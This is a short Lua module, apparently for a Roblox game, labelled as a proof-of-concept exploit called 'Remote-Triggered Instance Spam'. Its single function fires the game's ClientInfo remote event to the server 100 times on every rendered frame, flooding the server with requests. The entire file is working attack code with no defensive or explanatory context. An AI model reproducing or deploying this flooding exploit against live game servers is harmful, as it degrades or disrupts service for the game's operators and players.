--[[
    V24 - Remote-Triggered Instance Spam
    Proof of Concept Exploit
]]

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local ClientInfo = ReplicatedStorage.Remotes.ClientInfo

local function spamRemotes(skillName)
    RunService.RenderStepped:Connect(function()
        for i = 1, 100 do
            ClientInfo:FireServer(skillName)
        end
    end)
end

return { spamRemotes = spamRemotes }
